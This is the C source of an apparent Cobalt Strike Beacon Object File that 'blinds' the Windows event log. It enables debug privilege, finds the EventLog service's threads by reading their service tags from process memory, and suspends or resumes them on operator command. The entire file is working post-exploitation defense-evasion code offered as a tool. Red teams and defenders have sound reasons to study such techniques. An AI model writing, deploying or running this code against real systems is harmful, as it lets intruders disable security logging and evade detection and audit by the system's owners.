#include "blindeventlog.h"

#pragma comment(lib,"Advapi32.lib")
#pragma comment(lib,"shell32.lib")

// //START TrustedSec BOF print code: https://github.com/trustedsec/CS-Situational-Awareness-BOF/blob/master/src/common/base.c
// #ifndef bufsize
// #define bufsize 8192
// #endif
// char *output = 0;  
// WORD currentoutsize = 0;
// HANDLE trash = NULL; 
// int bofstart();
// void internal_printf(const char* format, ...);
// void printoutput(BOOL done);

// int bofstart() {   
//     output = (char*)MSVCRT$calloc(bufsize, 1);
//     currentoutsize = 0;
//     return 1;
// }

// void internal_printf(const char* format, ...){
//     int buffersize = 0;
//     int transfersize = 0;
//     char * curloc = NULL;
//     char* intBuffer = NULL;
//     va_list args;
//     va_start(args, format);
//     buffersize = MSVCRT$vsnprintf(NULL, 0, format, args); 
//     va_end(args);
    
//     if (buffersize == -1) return;
    
//     char* transferBuffer = (char*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, bufsize);
// 	intBuffer = (char*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, buffersize);
//     va_start(args, format);
//     MSVCRT$vsnprintf(intBuffer, buffersize, format, args); 
//     va_end(args);
//     if(buffersize + currentoutsize < bufsize) 
//     {
//         MSVCRT$memcpy(output+currentoutsize, intBuffer, buffersize);
//         currentoutsize += buffersize;
//     } else {
//         curloc = intBuffer;
//         while(buffersize > 0)
//         {
//             transfersize = bufsize - currentoutsize;
//             if(buffersize < transfersize) 
//             {
//                 transfersize = buffersize;
//             }
//             MSVCRT$memcpy(output+currentoutsize, curloc, transfersize);
//             currentoutsize += transfersize;
//             if(currentoutsize == bufsize)
//             {
//                 printoutput(FALSE); 
//             }
//             MSVCRT$memset(transferBuffer, 0, transfersize); 
//             curloc += transfersize; 
//             buffersize -= transfersize;
//         }
//     }
// 	KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, intBuffer);
// 	KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, transferBuffer);
// }

// void printoutput(BOOL done) {
//     char * msg = NULL;
//     BeaconOutput(CALLBACK_OUTPUT, output, currentoutsize);
//     currentoutsize = 0;
//     MSVCRT$memset(output, 0, bufsize);
//     if(done) {MSVCRT$free(output); output=NULL;}
// }
// //END TrustedSec BOF print code.


BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)
{
	HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

	if (!Advapi32$OpenProcessToken(
		KERNEL32$GetCurrentProcess(),
		TOKEN_ADJUST_PRIVILEGES,
		&hToken)
	)
	{
		return FALSE;
	}
    
	if (!Advapi32$LookupPrivilegeValueA(NULL, lpszPrivilege, &luid))
	{
		return FALSE; 
	}

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    
	if (bEnablePrivilege)
	{
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	}
    else
	{
        tp.Privileges[0].Attributes = 0;
	}

    if (!Advapi32$AdjustTokenPrivileges(
		hToken,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		(PTOKEN_PRIVILEGES) NULL,
		(PDWORD) NULL)
	)
	{
		return FALSE;
	}
    
	if (KERNEL32$GetLastError() == ERROR_NOT_ALL_ASSIGNED)
	{
		return FALSE;
	}

    return TRUE;
}

BOOL Eventlog(int action, BOF_Buffer* buffer)
{
	SERVICE_STATUS_PROCESS svcStatus = {0};
	
	DWORD bytesNeeded = 0;

	HANDLE hSvcProc = NULL;
	HANDLE hThreadSnap = INVALID_HANDLE_VALUE;

	THREADENTRY32 te32;
	THREAD_BASIC_INFORMATION threadBasicInfo;

	PVOID subProcessTag = NULL;

	BOOL bIsWoW64 = FALSE;
	DWORD dwOffset = NULL;

	BOOL result = FALSE;
	
	NtQueryInformationThread_t pNtQueryInformationThread = (NtQueryInformationThread_t)GetProcAddress(
		GetModuleHandle("ntdll.dll"),
		"NtQueryInformationThread"
	);

	I_QueryTagInformation_t pI_QueryTagInformation = (I_QueryTagInformation_t)GetProcAddress(
		GetModuleHandle("advapi32.dll"),
		"I_QueryTagInformation"
	);
	
	SC_HANDLE sc = Advapi32$OpenSCManagerA(".", NULL, MAXIMUM_ALLOWED);
	SC_HANDLE svc = Advapi32$OpenServiceA(sc, "EventLog", MAXIMUM_ALLOWED);

	Advapi32$QueryServiceStatusEx(
		svc,
		SC_STATUS_PROCESS_INFO,
		(LPBYTE)&svcStatus,
		sizeof(svcStatus),
		&bytesNeeded
	);
	DWORD svcPID = svcStatus.dwProcessId;
	
	hSvcProc = KERNEL32$OpenProcess(PROCESS_VM_READ, FALSE, svcPID);
	if (hSvcProc == NULL)
	{
		BeaconPrintf(CALLBACK_ERROR,"Failed to open handle to eventlog process: %d\n", svcPID);
		return result;
	}

	// internal_printf("[+] Opened handle to eventlog process: %d\n", svcPID);
	BofPrintf(buffer, "[+] Opened handle to eventlog process: %d\n", svcPID);

	hThreadSnap = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (hThreadSnap == INVALID_HANDLE_VALUE)
	{
		return result;
	}

	te32.dwSize = sizeof(THREADENTRY32);
	
	if (!KERNEL32$Thread32First(hThreadSnap, &te32))
	{
		KERNEL32$CloseHandle(hThreadSnap);
		return result;
	}
		
	do
	{
		if (te32.th32OwnerProcessID == svcPID)
		{

			HANDLE hThread = KERNEL32$OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);
			if (hThread == NULL)
			{
				return result;
			}

			NTSTATUS status = pNtQueryInformationThread(
				hThread,
				(THREAD_INFORMATION_CLASS)0,
				&threadBasicInfo,
				sizeof(threadBasicInfo),
				NULL
			);

			bIsWoW64 = KERNEL32$IsWow64Process(hSvcProc, &bIsWoW64);
			if (!bIsWoW64)
			{
				dwOffset = 0x1720;
			}
			else
			{
				dwOffset = 0xf60;
			}
			
			KERNEL32$ReadProcessMemory(
				hSvcProc,
				((PBYTE)threadBasicInfo.pTebBaseAddress + dwOffset),
				&subProcessTag,
				sizeof(subProcessTag),
				NULL
			);

			if (!subProcessTag)
			{
				KERNEL32$CloseHandle(hThread);
				continue;
			}	
				
			SC_SERVICE_TAG_QUERY query = { 0 };
			
			if (pI_QueryTagInformation)
			{
				query.processId = (ULONG) svcPID;
				query.serviceTag = (ULONG) subProcessTag;
				query.reserved = 0;
				query.pBuffer = NULL;
				
				pI_QueryTagInformation(NULL, ServiceNameFromTagInformation, &query);

				if (MSVCRT$_wcsicmp((wchar_t *) query.pBuffer, L"eventlog") == 0)
				{
					if(action == 1 && KERNEL32$SuspendThread(hThread) != -1)
					{
						// internal_printf("\t- Suspended Eventlog thread: %d\n", te32.th32ThreadID);
						BofPrintf(buffer, "\t- Suspended Eventlog thread: %d\n", te32.th32ThreadID);
						result = TRUE;
					}
					else if (action == 2 && KERNEL32$ResumeThread(hThread) != -1)
					{
						// internal_printf("\t- Resumed Eventlog thread: %d\n", te32.th32ThreadID);
						BofPrintf(buffer, "\t- Resumed Eventlog thread: %d\n", te32.th32ThreadID);
						result = TRUE;
					}
					else
					{
						// internal_printf("\t- [!] Failed to change the state of the Eventlog thread: %d\n", te32.th32ThreadID);
						BofPrintf(buffer, "\t- [!] Failed to change the state of the Eventlog thread: %d\n", te32.th32ThreadID);
						result = FALSE;
					}
				}
			}

			KERNEL32$CloseHandle(hThread);
		}

	} while (KERNEL32$Thread32Next(hThreadSnap, &te32));

	KERNEL32$CloseHandle(hThreadSnap);
	KERNEL32$CloseHandle(hSvcProc);

    return result;
}

int go(char *args, int len)
{
	BOOL res = FALSE;
	CHAR *action;
	datap parser;

	BOF_Buffer buffer = {0};

	if (!BofBufferInit(&buffer))
    {
        goto cleanup;
    }
	
	BeaconDataParse(&parser, args, len);
	action = BeaconDataExtract(&parser, NULL);
	// if(!bofstart()) return;

	if (!SetPrivilege(SE_DEBUG_NAME, ENABLE))
	{
		BeaconPrintf(CALLBACK_ERROR, "Not enough privileges to interact with Eventlog.\n");
		goto cleanup;
	}
	
	if (MSVCRT$strcmp(action, "suspend") == 0)
	{
		res = Eventlog(1, &buffer);
	}
	else if (MSVCRT$strcmp(action, "resume") == 0)
	{
		res = Eventlog(2, &buffer);
	}
	else
	{
		BeaconPrintf(CALLBACK_ERROR, "Please specify one of the following options: suspend | resume\n");
		goto cleanup;
	}

cleanup:
	if(!res)
	{
		BeaconPrintf(CALLBACK_ERROR, "Failed to blind Eventlog!\n");
	}
	else
	{
		// printoutput(TRUE);
		//BeaconPrintf(CALLBACK_OUTPUT, "[+] Done");
	}

	BofBufferFree(&buffer);
	
	return 0;
}
